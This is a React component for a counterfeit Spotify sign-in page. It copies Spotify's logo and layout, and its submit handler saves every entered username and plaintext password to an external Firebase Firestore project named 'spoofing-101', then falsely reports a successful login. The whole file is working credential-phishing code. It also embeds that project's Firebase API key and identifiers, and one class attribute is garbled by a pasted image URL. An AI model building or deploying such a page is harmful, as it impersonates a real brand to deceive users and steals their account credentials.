import React, { useState } from "react";
import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc } from "firebase/firestore";

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyA-rTTo3pT-5Fnd35qsLQm0gyH8p5TuREg",
  authDomain: "spoofing-101.firebaseapp.com",
  projectId: "spoofing-101",
  storageBucket: "spoofing-101.firebasestorage.app",
  messagingSenderId: "753991098564",
  appId: "1:753991098564:web:d20b58c184b942c27ba991",
  measurementId: "G-ZS55C8ZPJR",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const SpotifyLogin = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      // Push login data to Firestore
      await addDoc(collection(db, "users"), {
        username: username,
        password: password,
      });
      alert("Login Successful!");
      setUsername("");
      setPassword("");
    } catch (error) {
      console.error("Error saving data:", error);
      alert("Failed to login. Try again.");
    }
  };

  // Form validation
  const isValid = () => username.length >= 1 && password.length >= 1;

  return (
    <div className="min-h-screen bg-black flex items-center justify-center p-4">
      <div className="bg-black rounded-lg shadow-lg p-8 w-full max-w-md">
        <div className="flex flex-col items-center mb-6">
          <img
            src="images/spotify.png"
            alt="Spotify Logo"
            className="w-36"
          />
          <h1 className="text-3xl font-semibold text-white mt-4">Spotify</h1>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Username */}
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-2">
              Username
            </label>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full px-4 py-2 border border-gray-700 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 bg-gray-800 text-white"
              placeholder="Enter your username"
              required
            />
          </div>

          {/* Password */}
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-2">
              Password
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-2 border border-gray-700 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 bg-gray-800 text-white"
              placeholder="Enter your password"
              required
            />
          </div>

          {/* Actions */}
          <div>
            <button
              type="submit"
              disabled={!isValid()}
              className="w-full px-4 py-2 bg-green-600 text-white font-medium rounded-lg hover:bg-green-700 disabled:bg-green-300 disabled:cursor-not-allowed"
            >
              Sign In
            </button>
          </div>

          <div className="text-center text-gray-400 text-sm mt-4">
            <p>or sign up with</p>
            <div className="flex justify-center space-x-4 mt-2">
              <button className="p-2 bg-gray-700 rounded-full hover:bg-gray-600">
                <img
                  src="https://w7.pngwing.com/pngs/63/1016/png-transparent-google-logo-google-logo-g-suite-chrome-text-logo-chrome.png"
                  alt="Google"
                  className="w-5 h-5"
                />
              </button>
              <button className="p-2 bg-gray-700 rouhttps://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.pngnded-full hover:bg-gray-600">
                <img
                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Facebook_logo_%28square%29.png/640px-Facebook_logo_%28square%29.png"
                  alt="Facebook"
                  className="w-5 h-5"
                />
              </button>
            </div>
          </div>

          <div className="text-center text-gray-400 text-sm mt-4">
            <p>
              Don’t have an account?{" "}
              <a href="#signup" className="text-green-500 hover:underline">
                Sign up
              </a>
            </p>
          </div>
        </form>
      </div>
    </div>
  );
};

export default SpotifyLogin;
